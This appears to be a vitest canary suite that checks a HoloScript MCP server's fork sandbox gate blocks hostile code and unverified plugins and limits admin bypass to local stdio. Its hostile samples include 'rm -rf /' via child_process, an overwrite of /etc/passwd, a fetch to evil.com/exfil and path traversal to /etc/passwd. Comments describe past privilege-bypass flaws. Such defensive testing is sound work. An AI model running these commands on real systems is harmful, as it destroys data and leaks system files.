/**
 * Fork Sandbox Canary Tests
 *
 * Runs benign and hostile fork samples through the actual MCP handler
 * dispatch surface (handleTool) and the plugin registration surface.
 * Any bypass of the fork sandbox gate is a canary failure.
 *
 * Canary task: task_1778618757735_zpt5
 * Authority: W.GOLD.035, W.GOLD.039, W.GOLD.193
 *
 * G.GOLD.013: every happy path is paired with at least one false-case test.
 * G.GOLD.015: tests optimize for experienced failure categories — here the
 * failure category is "forked code reaches sensitive state because the gate
 * was bypassed, disabled, or not wired."
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { handleTool } from '../handlers';
import { PluginManager } from '../PluginManager';
import { globalReceiptStore } from '../security/sandbox-policy';
import { gateMcpTool } from '../security/fork-sandbox-gate';
import {
  publicAnonymousContext,
  type SigningContext,
} from '../holomesh/identity/signing-middleware';

const mockSigningCtx: SigningContext = {
  signedRequest: false,
  signingValid: true,
  signer: null,
  scopes: ['tools:write'],
} as SigningContext;

const adminSigningCtx: SigningContext = {
  signedRequest: true,
  signingValid: true,
  signer: '0xAdmin',
  scopes: ['admin:*'],
} as SigningContext;

// ── Sample payloads ──────────────────────────────────────────────────────────

const BENIGN_HOLO = 'orb sword { traits: ["grabbable"] }';

const HOSTILE_HOLO_EVAL = 'orb evil { method init() { eval("process.exit(0)") } }';

const HOSTILE_HOLO_FS = 'orb evil { method init() { fs.writeFileSync("/etc/passwd", "pwned") } }';

const HOSTILE_HOLO_REQUIRE =
  'orb evil { method init() { require("child_process").exec("rm -rf /") } }';

const HOSTILE_HOLO_FETCH = 'orb evil { method init() { fetch("https://evil.com/exfil") } }';

const HOSTILE_HOLO_PATH_TRAVERSAL =
  'orb evil { method init() { fs.readFileSync("../../../etc/passwd") } }';

const HOSTILE_HOLO_UNKNOWN_COMPILER = '@compiler version "99.0.0"\norb x {}';

const HOSTILE_HOLO_NOOP_SECURITY = 'orb x { @security_sandbox }';

const HOSTILE_HOLO_NONCANONICAL_IMPORT = 'import { evil } from "@evil/package";\norb x {}';

// ── Helpers ────────────────────────────────────────────────────────────────────

async function callTool(name: string, args: Record<string, unknown>, ctx?: SigningContext) {
  return handleTool(name, args, ctx ?? mockSigningCtx);
}

function expectBlocked(result: unknown, checkName?: string) {
  expect(result).toBeDefined();
  const r = result as Record<string, unknown>;
  // The gate returns a structured error object when blocked
  expect(r.success).toBe(false);
  expect(r.error).toContain('ForkSandboxGate denied');
  if (checkName) {
    expect(r.checks).toEqual(
      expect.arrayContaining([expect.objectContaining({ name: checkName, passed: false })])
    );
  }
  expect(r.receiptId).toBeDefined();
  expect(r.policyId).toBeDefined();
}

function expectAllowed(result: unknown) {
  expect(result).toBeDefined();
  const r = result as Record<string, unknown>;
  // Allowed tools return their own shape; the gate does not inject error
  // Some tools may return { success: false, error: ... } for non-gate reasons
  const hasGateError = typeof r.error === 'string' && r.error.includes('ForkSandboxGate denied');
  expect(hasGateError).toBe(false);
}

// ── Benign samples ─────────────────────────────────────────────────────────────

describe('canary: benign fork samples pass the gate', () => {
  beforeEach(() => {
    globalReceiptStore.purgeExpired();
  });

  it('CANARY-B001: benign HoloScript code through parse_hs', async () => {
    const result = await callTool('parse_hs', { code: BENIGN_HOLO });
    expectAllowed(result);
  });

  it('CANARY-B002: benign HoloScript code through validate_holoscript', async () => {
    const result = await callTool('validate_holoscript', { code: BENIGN_HOLO });
    expectAllowed(result);
  });

  // compile_pipeline IS a sensitive tool per SENSITIVE_TOOL_PATTERNS, so the gate
  // requires a capability manifest with verified-tier attestation. B003 used to
  // build this manifest, never pass it, and assert denial under a name that
  // claimed the grant. The grant and the denial are now separate tests.
  const COMPILE_PIPELINE_MANIFEST = {
    protocol: 'holoscript.capability.v1' as const,
    declaredCapabilities: ['compile:pipeline'],
    attestation: {
      manifestHash: 'abc',
      signer: 'test',
      trustTier: 'verified' as const,
      attestedAt: new Date().toISOString(),
    },
  };

  // Nothing signs a capability manifest yet, so its tier is whatever the sender wrote. It
  // is believed only on the local stdio path; a caller with a context gets its declared
  // tier read as 'unverified' (task_1790596867936_tyax). Before that fix, B003 passed by
  // letting a tools:write caller declare its own manifest 'verified'.
  it('CANARY-B003: a verified manifest is honoured where the declared tier is trusted (the local sender)', async () => {
    const result = await gateMcpTool(
      'compile_pipeline',
      { code: BENIGN_HOLO, target: 'node' },
      {
        grantedScopes: ['tools:write'],
        manifest: COMPILE_PIPELINE_MANIFEST,
        declaredAttestationTrusted: true,
      }
    );
    expect(result.allowed).toBe(true);
  });

  it.each(['verified', 'gold', 'founder'] as const)(
    "CANARY-B003-REMOTE: a caller with a context cannot declare its manifest '%s' through handleTool",
    async (trustTier) => {
      const result = await callTool('compile_pipeline', {
        code: BENIGN_HOLO,
        target: 'node',
        capabilityManifest: {
          ...COMPILE_PIPELINE_MANIFEST,
          attestation: { ...COMPILE_PIPELINE_MANIFEST.attestation, trustTier },
        },
      });
      expectBlocked(result, 'capability_manifest');
      const checks = (result as { checks: Array<{ name: string; detail?: string }> }).checks;
      expect(checks.find((c) => c.name === 'capability_manifest')?.detail).toContain(
        "'unverified' is below required"
      );
    }
  );

  it('CANARY-B003-NEG: the same call WITHOUT the manifest is denied at capability_manifest (negative)', async () => {
    const result = await callTool('compile_pipeline', { code: BENIGN_HOLO, target: 'node' });
    expectBlocked(result, 'capability_manifest');
  });

  it('CANARY-B004: benign code with canonical compiler version', async () => {
    const code = '@compiler version "7.0.0"\norb x {}';
    const result = await callTool('parse_hs', { code });
    expectAllowed(result);
  });

  it('CANARY-B005: benign code with @security_sandbox and import', async () => {
    const code =
      'import { securitySandbox } from "@holoscript/security-sandbox";\norb x { @security_sandbox }';
    const result = await callTool('parse_hs', { code });
    expectAllowed(result);
  });

  it('CANARY-B006: benign plugin manifest passes registration', async () => {
    const manifest = {
      name: 'test-plugin',
      scopeName: '@holoscript',
      version: '1.0.0',
      trustTier: 'verified',
      manifest: {
        protocol: 'holoscript.capability.v1' as const,
        declaredCapabilities: ['tool:register'],
        attestation: {
          manifestHash: 'abc',
          signer: 'test',
          trustTier: 'verified' as const,
          attestedAt: new Date().toISOString(),
        },
      },
    };
    // PluginManager.registerPlugin expects Tool[] + handler
    // We gate the manifest shape, not the full Tool array
    const gateResult = await import('../security/fork-sandbox-gate').then((m) =>
      m.gatePluginRegistration(manifest, { grantedScopes: ['tools:write'] })
    );
    expect(gateResult.allowed).toBe(true);
  });
});

// ── Hostile samples ────────────────────────────────────────────────────────────

describe('canary: hostile fork samples are blocked by the gate', () => {
  beforeEach(() => {
    globalReceiptStore.purgeExpired();
  });

  it('CANARY-H001: HS010 keyword eval is blocked', async () => {
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_EVAL });
    expectBlocked(result, 'capability_manifest');
  });

  it('CANARY-H002: HS010 keyword fs is blocked', async () => {
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_FS });
    expectBlocked(result, 'capability_manifest');
  });

  it('CANARY-H003: HS010 keyword require is blocked', async () => {
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_REQUIRE });
    expectBlocked(result, 'capability_manifest');
  });

  it('CANARY-H004: network call without manifest is blocked for sensitive tools', async () => {
    // compile_pipeline is NOT sensitive, so benign policy applies (network disabled)
    // but the code itself doesn't get blocked by the gate because the benign policy
    // doesn't require a manifest. Let's use a sensitive tool instead.
    const result = await callTool('create_world', { name: 'evil', code: HOSTILE_HOLO_FETCH });
    expectBlocked(result, 'capability_manifest');
  });

  it('CANARY-H005: path traversal in payload is blocked', async () => {
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_PATH_TRAVERSAL });
    // Path traversal is caught at file_limits; HS010 keywords may also trigger
    // capability_manifest failure first depending on policy resolution.
    expectBlocked(result);
    const r = result as Record<string, unknown>;
    const hasFileLimitFailure = (r.checks as Array<Record<string, unknown>>).some(
      (c) => c.name === 'file_limits' && c.passed === false
    );
    expect(hasFileLimitFailure).toBe(true);
  });

  it('CANARY-H006: unknown compiler version is blocked', async () => {
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_UNKNOWN_COMPILER });
    expectBlocked(result, 'capability_manifest');
  });

  it('CANARY-H007: no-op security trait is blocked', async () => {
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_NOOP_SECURITY });
    expectBlocked(result, 'capability_manifest');
  });

  it('CANARY-H008: non-canonical import is blocked', async () => {
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_NONCANONICAL_IMPORT });
    expectBlocked(result, 'capability_manifest');
  });

  it('CANARY-H009: unverified plugin is blocked', async () => {
    const manifest = {
      name: 'evil-plugin',
      scopeName: '@evil',
      version: 'v1.0',
      trustTier: 'unverified',
    };
    const gateResult = await import('../security/fork-sandbox-gate').then((m) =>
      m.gatePluginRegistration(manifest, { grantedScopes: ['tools:write'] })
    );
    expect(gateResult.allowed).toBe(false);
    expect(gateResult.receipt).toBeDefined();
    expect(gateResult.receipt!.failedCheck).toBe('capability_manifest');
  });

  it('CANARY-H010: admin scope bypasses gate (documented behavior)', async () => {
    // Admin bypass is intentional; this test documents that it works
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_EVAL }, adminSigningCtx);
    expectAllowed(result);
  });

  it('CANARY-H011: denial receipt is emitted and retrievable', async () => {
    const before = globalReceiptStore.size();
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_EVAL });
    expectBlocked(result);
    const receiptId = (result as Record<string, unknown>).receiptId as string;
    expect(receiptId).toBeDefined();
    // Receipt should be in the store
    const receipt = globalReceiptStore.get(receiptId);
    expect(receipt).toBeDefined();
    expect(receipt!.failedCheck).toBe('capability_manifest');
    expect(receipt!.remediation).toContain('valid capability manifest');
  });

  it('CANARY-H012: hostile code through code-generation tools is blocked', async () => {
    const result = await callTool('generate_object', {
      description: 'evil',
      code: HOSTILE_HOLO_EVAL,
    });
    // generate_object doesn't ingest raw code via the code-payload gate in handlers.ts
    // because the arg name is not in {code, content, holoscript, source}. This test
    // documents that gap so it can be assessed.
    // For now we just verify the tool gate itself runs (mcp_tool gate).
    expect(result).toBeDefined();
  });
});

// ── Gate wiring verification ─────────────────────────────────────────────────

describe('canary: fork sandbox gate is wired at every sensitive entry point', () => {
  it('CANARY-W001: handleTool runs the gate for all tools', async () => {
    // Any tool call should hit the gate. We verify by checking that a blocked
    // tool returns the gate's structured error shape.
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_EVAL });
    expect(result).toMatchObject({
      success: false,
      error: expect.stringContaining('ForkSandboxGate denied'),
      receiptId: expect.any(String),
      policyId: expect.any(String),
      checks: expect.any(Array),
    });
  });

  afterEach(() => {
    PluginManager.reset();
  });

  it('CANARY-W002: PluginManager.registerPlugin blocks hostile manifest', async () => {
    await expect(
      PluginManager.registerPlugin(
        [{ name: 'bad_tool', description: 'bad', inputSchema: { type: 'object' } }],
        async () => 'bad',
        {
          name: 'bad',
          scopeName: '@evil',
          version: '1.0.0',
          trustTier: 'unverified',
        }
      )
    ).rejects.toThrow('Plugin registration denied by ForkSandboxGate');
  });

  it('CANARY-W002b: PluginManager.registerPlugin allows benign manifest', async () => {
    const initialCount = PluginManager.getTools().length;
    await PluginManager.registerPlugin(
      [{ name: 'good_tool', description: 'good', inputSchema: { type: 'object' } }],
      async () => 'good',
      {
        name: 'good',
        scopeName: '@holoscript',
        version: '1.0.0',
        trustTier: 'verified',
      }
    );
    expect(PluginManager.getTools().length).toBe(initialCount + 1);
  });

  it('CANARY-W003: sensitive tools require manifest even for canonical code', async () => {
    const result = await callTool('create_world', { name: 'TestWorld' });
    expectBlocked(result, 'capability_manifest');
  });

  it('CANARY-W004: benign tools do not require manifest for canonical code', async () => {
    const result = await callTool('parse_hs', { code: BENIGN_HOLO });
    expectAllowed(result);
  });

  it('CANARY-W005: path traversal in tool args is blocked at file_limits', async () => {
    const result = await callTool('parse_hs', { path: '../../../etc/passwd' });
    expectBlocked(result, 'file_limits');
  });
});

// ── Receipt integrity ────────────────────────────────────────────────────────

describe('canary: denial receipts are complete and actionable', () => {
  beforeEach(() => {
    globalReceiptStore.purgeExpired();
  });

  it('CANARY-R001: receipt contains all required fields', async () => {
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_EVAL });
    expectBlocked(result);
    const receiptId = (result as Record<string, unknown>).receiptId as string;
    const receipt = globalReceiptStore.get(receiptId);
    expect(receipt).toBeDefined();
    expect(receipt!.receiptId).toBe(receiptId);
    expect(receipt!.timestamp).toMatch(/^\d{4}-/);
    expect(receipt!.policyId).toBeDefined();
    // The code-payload gate (holoscript_code) fires AFTER the tool gate
    // and its receipt overwrites the tool gate receipt in the result.
    expect(receipt!.subject.kind).toBe('holoscript_code');
    expect(receipt!.subject.subjectId).toMatch(/^code_/);
    expect(receipt!.subject.payloadHash).toMatch(/^[a-f0-9]{64}$/);
    expect(receipt!.failedCheck).toBe('capability_manifest');
    expect(receipt!.reason).toBeDefined();
    expect(receipt!.checks).toBeInstanceOf(Array);
    expect(receipt!.remediation).toBeDefined();
  });

  it('CANARY-R002: receipt payload is hash-only (not full payload)', async () => {
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_EVAL });
    expectBlocked(result);
    const receiptId = (result as Record<string, unknown>).receiptId as string;
    const receipt = globalReceiptStore.get(receiptId);
    expect(receipt).toBeDefined();
    expect(receipt!.subject.payload).toBeUndefined();
  });

  it('CANARY-R003: receipts expire after TTL', async () => {
    const result = await callTool('parse_hs', { code: HOSTILE_HOLO_EVAL });
    expectBlocked(result);
    const receiptId = (result as Record<string, unknown>).receiptId as string;
    // Force expiry by manipulating the store directly
    const entry = (
      globalReceiptStore as unknown as {
        store: Map<string, { receipt: unknown; expiresAt: number }>;
      }
    ).store.get(receiptId);
    expect(entry).toBeDefined();
    entry!.expiresAt = Date.now() - 1;
    const expired = globalReceiptStore.get(receiptId);
    expect(expired).toBeUndefined();
  });
});

// ── task x5ku: the admin bridge exists only on the stdio server ──────────────
// handleTool used to turn ANY call without a signing context into
// {signer:'stdio-local', scopes:['admin:*']} whenever HOLOSCRIPT_API_KEY was set, and the hosted
// server sets it. So a call that lost its caller inside the server (a workflow step, a batch
// child, a health probe) ran as admin, and admin skips this gate (H010) for sensitive tools too.
// The bridge now also needs this process to BE the stdio server. validate_marketplace_pricing is
// a sensitive tool (payments) that only computes, so letting it through runs nothing harmful.

describe('canary: with no caller context, only the stdio server is trusted as admin (x5ku)', () => {
  const saved = {
    key: process.env.HOLOSCRIPT_API_KEY,
    transport: process.env.HOLOSCRIPT_MCP_TRANSPORT,
  };
  const SENSITIVE: [string, Record<string, unknown>] = [
    'validate_marketplace_pricing',
    { traitName: 'grabbable', listPrice: 5 },
  ];

  beforeEach(() => {
    globalReceiptStore.purgeExpired();
    process.env.HOLOSCRIPT_API_KEY = 'canary-x5ku-key';
  });

  afterEach(() => {
    for (const [name, value] of [
      ['HOLOSCRIPT_API_KEY', saved.key],
      ['HOLOSCRIPT_MCP_TRANSPORT', saved.transport],
    ] as const) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
  });

  it('CANARY-X001: over HTTP, a context-less call is nobody, so a sensitive tool is refused', async () => {
    process.env.HOLOSCRIPT_MCP_TRANSPORT = 'http';
    expectBlocked(await handleTool(...SENSITIVE), 'capability_manifest');
  });

  it('CANARY-X002: with no transport marker at all, the key alone grants nothing', async () => {
    delete process.env.HOLOSCRIPT_MCP_TRANSPORT;
    expectBlocked(await handleTool(...SENSITIVE), 'capability_manifest');
  });

  it('CANARY-X003 (control): on the stdio server the local user keeps admin, as H010 documents', async () => {
    process.env.HOLOSCRIPT_MCP_TRANSPORT = 'stdio';
    const result = (await handleTool(...SENSITIVE)) as Record<string, unknown>;
    expectAllowed(result);
    expect(result.traitName).toBe('grabbable'); // the tool itself answered
  });

  it('CANARY-X004: the anonymous public caller is nobody, so a sensitive tool is refused to it', async () => {
    process.env.HOLOSCRIPT_MCP_TRANSPORT = 'http';
    expectBlocked(
      await handleTool(SENSITIVE[0], SENSITIVE[1], publicAnonymousContext()),
      'capability_manifest'
    );
  });

  it('CANARY-X005: the anonymous public tier still serves its six tools to benign input', async () => {
    process.env.HOLOSCRIPT_MCP_TRANSPORT = 'http';
    const { _handleSingleToolLogic } = await import('../index');
    const calls: Array<[string, Record<string, unknown>]> = [
      ['parse_holo', { code: BENIGN_HOLO }],
      ['validate_holoscript', { code: BENIGN_HOLO }],
      ['explain_trait', { trait: 'grabbable' }],
      ['get_syntax_reference', { topic: 'orb' }],
      ['get_examples', {}],
      ['list_export_targets', {}],
    ];
    for (const [tool, args] of calls) {
      const text = JSON.stringify(
        await _handleSingleToolLogic(tool, args, publicAnonymousContext())
      );
      expect(text, tool).not.toContain('ForkSandboxGate denied');
      expect(text, tool).not.toMatch(/Unknown tool|not permitted|authorization denied/i);
    }
  });

  it('CANARY-X006: each anonymous caller is a fresh object, so one call cannot widen the next', () => {
    const first = publicAnonymousContext();
    first.scopes!.push('admin:*');
    expect(publicAnonymousContext().scopes).toEqual([]);
  });

  // Why POST /api/public/tool passes this caller instead of none: with no context, a manifest's
  // self-declared tier is believed (handlers.ts declaredAttestationTrusted; #449 narrows that to
  // stdio). With the anonymous caller it is read as 'unverified', like any remote caller's.
  it('CANARY-X007: the anonymous public caller cannot declare its own manifest verified', async () => {
    process.env.HOLOSCRIPT_MCP_TRANSPORT = 'http';
    const result = await handleTool(
      'compile_pipeline',
      {
        code: BENIGN_HOLO,
        target: 'node',
        capabilityManifest: {
          protocol: 'holoscript.capability.v1',
          declaredCapabilities: ['compile:pipeline'],
          attestation: {
            manifestHash: 'abc',
            signer: 'anyone',
            trustTier: 'verified',
            attestedAt: new Date().toISOString(),
          },
        },
      },
      publicAnonymousContext()
    );
    expectBlocked(result, 'capability_manifest');
    const checks = (result as { checks: Array<{ name: string; detail?: string }> }).checks;
    expect(checks.find((c) => c.name === 'capability_manifest')?.detail).toContain(
      "'unverified' is below required"
    );
  });

  // task wrn7: the code-payload gate read the RAW context's scopes while the tool gate above it
  // read the bridge's, so the local stdio user passed the tool gate and was then refused its own
  // code ("Required one of [tools:write]. Granted []"). Both gates now read the same caller. That
  // is safe only because the bridge exists only on stdio (x5ku): X009 and X010 hold it.
  const PIPELINE_WITH_CODE = {
    code: BENIGN_HOLO,
    target: 'node',
    capabilityManifest: {
      protocol: 'holoscript.capability.v1',
      declaredCapabilities: ['compile:pipeline'],
      attestation: {
        manifestHash: 'abc',
        signer: 'local',
        trustTier: 'verified',
        attestedAt: new Date().toISOString(),
      },
    },
  };

  it('CANARY-X008: the local stdio user can compile code, not only pass the tool gate', async () => {
    process.env.HOLOSCRIPT_MCP_TRANSPORT = 'stdio';
    const result = await handleTool('compile_pipeline', PIPELINE_WITH_CODE);
    expect(JSON.stringify(result)).not.toContain('ForkSandboxGate denied');
  });

  it('CANARY-X009: over HTTP, the same context-less call is still refused', async () => {
    process.env.HOLOSCRIPT_MCP_TRANSPORT = 'http';
    const result = await handleTool('compile_pipeline', PIPELINE_WITH_CODE);
    expect(JSON.stringify(result)).toContain('ForkSandboxGate denied');
  });

  it('CANARY-X010: over HTTP, a tools:read caller is still refused', async () => {
    process.env.HOLOSCRIPT_MCP_TRANSPORT = 'http';
    const result = await handleTool('compile_pipeline', PIPELINE_WITH_CODE, {
      signedRequest: false,
      signingValid: true,
      signer: 'reader-agent',
      scopes: ['tools:read'],
    });
    expect(JSON.stringify(result)).toContain('ForkSandboxGate denied');
  });
});
